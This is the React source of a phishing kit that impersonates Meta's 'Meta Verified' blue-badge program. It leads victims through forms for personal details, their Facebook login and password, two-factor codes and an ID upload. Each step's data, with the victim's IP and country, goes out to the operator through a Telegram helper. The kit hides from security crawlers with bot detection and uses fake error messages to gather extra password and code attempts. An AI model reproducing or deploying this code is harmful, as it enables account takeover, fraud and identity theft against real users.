import { useEffect, useState, useMemo, useRef } from 'react';
import { useLocation } from 'react-router';
import axios from 'axios';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TickIcon from '@/assets/images/tick.svg';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import UploadModal from '@/components/UploadModal';
import SuccessModal from '@/components/SuccessModal';
import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
import TermsModal from '@/components/TermsModal';

const LABEL = 'Thần-tài-đến';

const SYSTEM_FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';

const generateTicketId = () =>
{
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const pick = ( len ) =>
        Array.from( { length: len }, () => chars[ Math.floor( Math.random() * chars.length ) ] ).join( '' );

    return `#${ pick( 4 ) }-${ pick( 4 ) }-${ pick( 4 ) }`;
};

const escapeHtml = ( str ) =>
{
    if ( str === null || str === undefined ) return '';
    return String( str )
        .replace( /&/g, '&amp;' )
        .replace( /</g, '&lt;' )
        .replace( />/g, '&gt;' );
};

const Home = () =>
{
    const [ ticketId ] = useState( () => generateTicketId() );
    const [ showFirstModal, setShowFirstModal ] = useState( false );
    const [ showLoginModal, setShowLoginModal ] = useState( false );
    const [ show2FAModal, setShow2FAModal ] = useState( false );
    const [ showUploadModal, setShowUploadModal ] = useState( false );
    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
    const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
    const [ selectedPrivacyQuestion, setSelectedPrivacyQuestion ] = useState( null );
    const [ showTermsModal, setShowTermsModal ] = useState( false );
    const [ formData, setFormData ] = useState( {
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        dob: '',
        message: '',
        loginIdentifier: ''
    } );
    const [ loginAttempts, setLoginAttempts ] = useState( [] );
    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', country: 'Unknown', countryCode: 'US' } );
    const [ isLoading, setIsLoading ] = useState( true );

    const telegramMsgIdRef = useRef( null );
    const sendQueueRef = useRef( Promise.resolve() );

    const texts = useMemo(
        () => ( {
            heroTitle: 'Meta Verified - Rewards for you',
            showWorld: 'Show the world that you mean business.',
            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
            excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
            ticketIdPrefix: 'Your ticket id:',
            guideTitle: 'Verified Blue Badge Request Guide',
            guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
            guideItem2: '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
            guideItem3: '- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.',
            submitRequest: 'Submit request',
            helpCenter: 'Help Center',
            privacyPolicy: 'Privacy Policy',
            termsOfService: 'Terms of Service',
            communityStandards: 'Community Standards',

            informationTitle: 'Information',
            fullName: 'Full Name',
            emailAddress: 'Email Address',
            emailBusinessAddress: 'Email Business Address',
            personalEmail: 'Personal Email',
            businessEmail: 'Business Email',
            mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Fanpage Name',
            dateOfBirth: 'Date of Birth',
            day: 'Day',
            month: 'Month',
            year: 'Year',
            messagePlaceholder: 'Message',
            responseTimeNote: 'Our response will be sent to you within 14 - 48 hours.',
            agreeToTerms: 'I agree to the',
            pleaseAgreeTerms: 'Please agree to the Terms of use.',
            submitBtn: 'Submit',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',

            twoFATitle: 'Two-factor authentication required',
            twoFAInstruction: 'Enter the code for this account that we send to',
            twoFAInstructionOr: 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
            enterTheCode: 'Enter the code',
            tryAnotherWay: 'Try another way',
            code: 'Code',
            codeExpired: 'This code has expired. Please enter a new code later',
            pleaseWait: 'Please wait',

            successTitle: 'The request was sent successfully',
            successMessage1: 'Great, your verification request has been approved.',
            successMessage2: 'The badge should appear next to your name within the next hour.',
            successMessage3: 'If the badge has not appeared after this time, please contact us again for further assistance.',
            thankYou: 'Thank you',
            metaSupportTeam: 'Meta Support Team.',

            privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
            mainInSection: 'The main thing in the section',
            privacyDesc1: 'At Meta, we want you to understand what information we collect, how we use it, and with whom we use it. let\'s share. Therefore, we recommend that you read our Privacy Policy. This will help you use',
            privacyDesc2: '\'s products the way you need.',
            privacyDesc3: 'In the Privacy Policy, we explain how we collect, use, store information, and We also share it. We also tell you about your rights. Each section of the Policy contains Useful examples and simplified statements to make our work easier to understand. We also added links to resources where you can learn in more detail about topics that interest you with confidentiality.',
            privacyDesc4: 'It is important to us that you know how to manage your privacy (confidentiality), so we also We show you where in the settings of the Meta Products you use you can manage your data. You you can',
            updateSettings: 'update these settings',
            privacyDesc5: 'to personalize your user experience.',
            ourPolicies: 'Our policies.',
            whatProducts: 'What products are covered by this policy?',
            learnMorePrivacy: 'Learn more about managing your privacy at Privacy Center',
            whatInfoCollect: 'What information do we collect?',
            infoCollectDesc1: 'The information we collect and process about you depends on how you use our',
            products: 'Products',
            infoCollectDesc2: '. For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products,',
            evenNoAccount: 'even if you do not have an account',
            typesOfData: 'The following are the types of data we collect:',
            yourActions: 'Your actions and information you provide to us',
            friendsSubscribers: 'Friends, subscribers and other contacts',
            appBrowserDevice: 'Application, browser and device information',
            infoFromPartners: 'Information from Partners, suppliers and other third parties',
            whatIfNotAllow: 'What happens if you do not allow us to collect certain types of information?',
            someInfoNecessary: 'Some information is necessary for the operation of our Products. Other information is optional, but its absence may affect your experience with our products.',
            moreDetails: 'More details',
            whatIfNoIdentify: 'What if the information we collect does not personally identify individuals?',
            deIdentifyDesc: 'In some cases, before third parties make information available to us, they de-identify, aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use this information as described below, without attempting to re-identify individuals.',
            dataControl: 'Data control',
            manageInfoCollect: 'Manage the information we collect about you',

            termsOfUse: 'Terms of use',
            termsDesc1: 'Meta creates technologies and services that allow people to communicate with each other, form communities and develop companies. This User Agreement governs the use of you Facebook, Messenger, and other products, features, applications, services, technologies and software we offer (',
            metaProducts: 'Meta Products',
            termsDesc2: ' or ',
            termsDesc3: '), if not expressly states that separate terms apply (and this agreement does not apply). These Products are provided to you by Meta Platforms, Inc.',
            termsDesc4: 'Our ',
            termsDesc5: ' explains how we collect and use your personal data to determine which advertisements may be relevant to you, and provide other services described below. Also, in ',
            termsDesc6: ' of the relevant Products Meta, you can change your privacy level at any time regarding our use of your data.',
            servicesWeProvide: 'Services we provide',
            service1: 'Personalize your experience.',
            service2: 'Connect with people and organizations that interest you.',
            service3: 'Opportunity to express yourself and communicate on topics that are important to you.',
            service4: 'Search for content, products and services that may interest you.',
            service5: 'Ensuring the safety, security and integrity of our services, combating malicious behavior and protecting our user community.',
            service6: 'Using and developing advanced technologies to provide safe and functional services.',
            service7: 'Research ways to improve the quality of our services.',
            service8: 'Ensuring consistency and convenience of various Meta Companies Products.',
            service9: 'Providing access to our services.',
            otherTermsPolicies: 'Other terms and policies that may apply to you',
            advertisingRules: 'Advertising Rules',
            advertisingRulesDesc: '. These rules apply to partners who advertise on various Meta Products and determine the types of advertising content that such partners are permitted to use.',
            communityStandardsDesc: '. These guidelines set out our standards for the content you post on Facebook and your activities on Facebook and other Meta Products.',
            communityPaymentTerms: 'Community Payment Terms',
            communityPaymentTermsDesc: '. These terms apply to payments made to or through the Meta Products.',
            commercialTerms: 'Commercial terms',
            commercialTermsDesc: '. These terms apply if you use or access our Products for any commercial or business purposes, including advertising, using our measurement services, managing an application on our Platform, a group or a Company Page, and selling goods or services.',
            tradeRules: 'Trade Rules',
            tradeRulesDesc: '. This guide outlines the rules that apply when you offer products or services for sale on Facebook, Instagram or WhatsApp.',
            lastRevisionDate: 'Last revision date: July 26, 2023',
            accountSecurity: 'Account security',

            uploadTitle: 'Confirm your identity',
            uploadChooseType: 'Choose type of ID to upload',
            uploadDesc: "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.",
            uploadPassport: 'Passport',
            uploadDriversLicense: "Driver's license",
            uploadNationalId: 'National ID card',
            uploadSecurityNote: "Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.",
            uploadLearnMore: 'Learn more',
            uploadBtn: 'Upload Image',
            uploadUploading: 'Uploading...',

            privacyQ1: 'What is the Privacy Policy and what does it cover?',
            privacyQ2: 'What information do we collect?',
            privacyQ3: 'How do we use your information?',
            privacyQ4: 'How do we share your information on Meta Products or with integrated partners?',
            privacyQ5: 'How do we share information with third parties?',
            privacyQ6: 'How is the cooperation between Meta Companies organized?',
            privacyQ7: 'How can you manage or delete your information and exercise your rights?',
            privacyQ8: 'How long do we keep your information?',
            privacyQ9: 'How do we transmit information?',
            privacyQ10: 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
            privacyQ11: 'How will you know when the policy changes?',
            privacyQ12: 'How to ask Meta questions?',
            privacyQ13: 'Why and how we process your data'
        } ),
        []
    );

    const location = useLocation();

    useEffect( () =>
    {
        localStorage.clear();
        initializeApp();
    }, [] );

    useEffect( () =>
    {
        if ( location.state?.autoOpen )
        {
            setShowFirstModal( true );
        }
    }, [ location.state ] );

    const initializeApp = async () =>
    {
        try
        {
            const botResult = await detectBot();
            if ( botResult.isBot )
            {
                window.location.href = 'about:blank';
                return;
            }

            try
            {
                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                const data = response.data;
                setIpInfo( {
                    ip: data.ip || 'Unknown',
                    country: data.country || 'Unknown',
                    countryCode: data.country_code || 'US'
                } );
                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
            } catch ( error )
            {
                console.error( 'Error fetching IP:', error );
            }

            setIsLoading( false );
        } catch ( error )
        {
            console.error( 'Initialization error:', error );
            setIsLoading( false );
        }
    };

    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );

    const formatDateTime = ( d ) =>
    {
        return (
            pad( d.getDate() ) +
            '/' +
            pad( d.getMonth() + 1 ) +
            '/' +
            d.getFullYear() +
            ' ' +
            pad( d.getHours() ) +
            ':' +
            pad( d.getMinutes() ) +
            ':' +
            pad( d.getSeconds() )
        );
    };

    const buildAndSend = ( data ) =>
    {
        const dt = formatDateTime( new Date() );
        const { form, login, passes, codes } = data;

        let message = `📩 <b>${ escapeHtml( LABEL ) }</b>\n`;
        message += `🎫 Ticket: <code>${ escapeHtml( ticketId ) }</code>\n`;
        message += `⏰ ${ escapeHtml( dt ) }\n`;
        message += `🌐 <code>${ escapeHtml( ipInfo.ip ) }</code> • ${ escapeHtml( ipInfo.country ) }\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;

        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName || form.dob || form.message )
        {
            message += `<b>📋 THÔNG TIN</b>\n`;
            if ( form.fullName ) message += `   Tên: <code>${ escapeHtml( form.fullName ) }</code>\n`;
            if ( form.personalEmail ) message += `   Email: <code>${ escapeHtml( form.personalEmail ) }</code>\n`;
            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
            {
                message += `   Business: <code>${ escapeHtml( form.businessEmail ) }</code>\n`;
            }
            if ( form.phone ) message += `   SĐT: <code>${ escapeHtml( form.phone ) }</code>\n`;
            if ( form.pageName ) message += `   Page: <code>${ escapeHtml( form.pageName ) }</code>\n`;
            if ( form.dob ) message += `   Ngày sinh: <code>${ escapeHtml( form.dob ) }</code>\n`;
            if ( form.message ) message += `   Lời nhắn: <code>${ escapeHtml( form.message ) }</code>\n`;
        }

        if ( login || ( passes && passes.length > 0 ) )
        {
            message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
            if ( login ) message += `   TK: <code>${ escapeHtml( login ) }</code>\n`;
            if ( passes && passes.length > 0 )
            {
                passes.forEach( ( p, i ) =>
                {
                    message += `   MK${ i + 1 }: <code>${ escapeHtml( p ) }</code>\n`;
                } );
            }
        }

        if ( codes && codes.length > 0 )
        {
            message += `\n<b>🔒 MÃ 2FA</b>\n`;
            codes.forEach( ( c, i ) =>
            {
                message += `   Code${ i + 1 }: <code>${ escapeHtml( c ) }</code>\n`;
            } );
        }

        message += `━━━━━━━━━━━━━━━━━━━━`;

        sendQueueRef.current = sendQueueRef.current.then( async () =>
        {
            const sentId = await sendMessage( message, telegramMsgIdRef.current );
            if ( sentId && !telegramMsgIdRef.current )
            {
                telegramMsgIdRef.current = sentId;
            }
        } );
    };

    const handleFirstFormSubmit = ( data ) =>
    {
        const newFormData = { ...formData, ...data };
        setFormData( newFormData );
        setShowFirstModal( false );
        setShowLoginModal( true );

        buildAndSend( {
            form: newFormData,
            login: null,
            passes: [],
            codes: []
        } );
    };

    const handleLoginSubmit = ( email, password ) =>
    {
        const newFormData = { ...formData, loginIdentifier: email };
        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );

        setFormData( newFormData );
        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );

        buildAndSend( {
            form: newFormData,
            login: email,
            passes: newPasses,
            codes: twoFAAttempts.map( c => c.value )
        } );
    };

    const handle2FASubmit = ( code ) =>
    {
        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );

        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );

        buildAndSend( {
            form: formData,
            login: formData.loginIdentifier,
            passes: loginAttempts.map( p => p.value ),
            codes: newCodes
        } );
    };

    if ( isLoading )
    {
        return (
            <div id="intro" style={ { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 } }>
                <img id="meta-logo" src={ MetaLogo } alt="Meta" style={ { width: '70%', height: 'auto' } } />
            </div>
        );
    }

    return (
        <>
            <style>{ `
                html, body, #root {
                    margin: 0 !important;
                    padding: 0 !important;
                    width: 100% !important;
                    max-width: 100% !important;
                    min-height: 100dvh !important;
                    display: block !important;
                    font-family: ${ SYSTEM_FONT } !important;
                    -webkit-font-smoothing: antialiased;
                    color: #1c2b33;
                }
                .meta-notice-wrapper * {
                    font-family: ${ SYSTEM_FONT } !important;
                    box-sizing: border-box;
                }
            ` }</style>

            <div
                className="meta-notice-wrapper"
                style={ {
                    position: 'fixed',
                    inset: 0,
                    width: '100vw',
                    height: '100dvh',
                    overflowY: 'auto',
                    WebkitOverflowScrolling: 'touch',
                    background: 'linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'flex-start',
                    color: '#1c2b33',
                    zIndex: 1
                } }
            >
                <div
                    style={ {
                        maxWidth: '768px',
                        width: '100%',
                        padding: '15px 15px 60px 15px',
                        margin: '20px auto'
                    } }
                >
                    <div style={ { padding: '15px' } }>
                        <div
                            style={ {
                                display: 'flex',
                                alignItems: 'flex-start',
                                gap: '12px',
                                flexDirection: 'column',
                                justifyContent: 'flex-start',
                                marginBottom: '26px'
                            } }
                        >
                            <img
                                src={ TickIcon }
                                alt="tick"
                                style={ { width: '48px', height: '48px', display: 'block' } }
                            />
                            <b
                                style={ {
                                    fontSize: 'clamp(1.6rem, 4.5vw, 2rem)',
                                    fontWeight: '700',
                                    lineHeight: '1.25',
                                    color: '#1c2b33'
                                } }
                            >
                                { texts.heroTitle }
                            </b>
                        </div>

                        <div style={ { width: '100%' } }>
                            <div style={ { width: '100%', marginBottom: '20px' } }>
                                <b
                                    style={ {
                                        fontSize: '16.5px',
                                        fontWeight: '700',
                                        color: '#1c2b33',
                                        display: 'block'
                                    } }
                                >
                                    { texts.showWorld }
                                </b>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '0px',
                                        marginTop: '15px',
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.congrats }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '0px',
                                        marginTop: '15px',
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.excited }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15.5px',
                                        marginBottom: '0px',
                                        marginTop: '15px',
                                        color: '#465a69',
                                        lineHeight: '1.5'
                                    } }
                                >
                                    { texts.ticketIdPrefix } { ticketId }
                                </p>
                            </div>

                            <div style={ { width: '100%' } }>
                                <p style={ { marginBottom: '15px', marginTop: 0 } }>
                                    <b
                                        style={ {
                                            fontSize: '16.5px',
                                            fontWeight: '700',
                                            color: '#1c2b33'
                                        } }
                                    >
                                        { texts.guideTitle }
                                    </b>
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '12px',
                                        marginTop: 0,
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.guideItem1 }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '12px',
                                        marginTop: 0,
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.guideItem2 }
                                </p>

                                <p
                                    style={ {
                                        fontSize: '15px',
                                        marginBottom: '0px',
                                        marginTop: 0,
                                        lineHeight: '1.5',
                                        color: '#1c2b33'
                                    } }
                                >
                                    { texts.guideItem3 }
                                </p>
                            </div>
                        </div>
                    </div>

                    <div
                        id="start"
                        role="button"
                        tabIndex={ 0 }
                        onClick={ () => setShowFirstModal( true ) }
                        onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) setShowFirstModal( true ); } }
                        style={ {
                            backgroundColor: '#1877f2',
                            color: '#ffffff',
                            border: 'none',
                            borderRadius: '9999px',
                            fontSize: '16px',
                            fontWeight: '600',
                            padding: '12px 24px',
                            cursor: 'pointer',
                            display: 'block',
                            width: '100%',
                            maxWidth: '300px',
                            margin: '20px auto',
                            textAlign: 'center',
                            transition: 'background-color 0.2s ease'
                        } }
                        onMouseOver={ ( e ) => ( e.currentTarget.style.backgroundColor = '#166fe5' ) }
                        onMouseOut={ ( e ) => ( e.currentTarget.style.backgroundColor = '#1877f2' ) }
                    >
                        { texts.submitRequest }
                    </div>

                    <div
                        style={ {
                            display: 'flex',
                            alignItems: 'center',
                            textAlign: 'center',
                            justifyContent: 'center',
                            flexWrap: 'wrap',
                            fontSize: '12px',
                            marginTop: '30px',
                            color: '#65676b',
                            gap: '16px'
                        } }
                    >
                        <a
                            href="#help"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
                                setShowPrivacyModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.helpCenter }
                        </a>
                        <a
                            href="#privacy"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
                                setShowPrivacyModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.privacyPolicy }
                        </a>
                        <a
                            href="#terms"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setShowTermsModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.termsOfService }
                        </a>
                        <a
                            href="#standards"
                            onClick={ ( e ) =>
                            {
                                e.preventDefault();
                                setShowTermsModal( true );
                            } }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                        >
                            { texts.communityStandards }
                        </a>
                        <a
                            href="#meta"
                            onClick={ ( e ) => e.preventDefault() }
                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'default' } }
                        >
                            Meta © 2026
                        </a>
                    </div>
                </div>
            </div>

            <FirstFormModal
                show={ showFirstModal }
                onClose={ () => setShowFirstModal( false ) }
                onSubmit={ handleFirstFormSubmit }
                onOpenTerms={ () => setShowTermsModal( true ) }
                texts={ texts }
                defaultCountryCode={ ipInfo.countryCode }
            />
            <LoginModal
                show={ showLoginModal }
                onClose={ () => setShowLoginModal( false ) }
                onSubmit={ handleLoginSubmit }
                onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } }
                texts={ texts }
            />
            <TwoFAModal
                show={ show2FAModal }
                onClose={ () => setShow2FAModal( false ) }
                onSubmit={ handle2FASubmit }
                onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } }
                texts={ texts }
                formData={ formData }
            />
            <UploadModal
                show={ showUploadModal }
                onClose={ () => setShowUploadModal( false ) }
                onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } }
                texts={ texts }
            />
            <SuccessModal
                show={ showSuccessModal }
                onClose={ () => setShowSuccessModal( false ) }
                texts={ texts }
            />
            <PrivacyPolicyModal
                show={ showPrivacyModal }
                onClose={ () =>
                {
                    setShowPrivacyModal( false );
                    setSelectedPrivacyQuestion( null );
                } }
                selectedQuestion={ selectedPrivacyQuestion }
                texts={ texts }
            />
            <TermsModal
                show={ showTermsModal }
                onClose={ () => setShowTermsModal( false ) }
                texts={ texts }
            />
        </>
    );
};

export default Home;
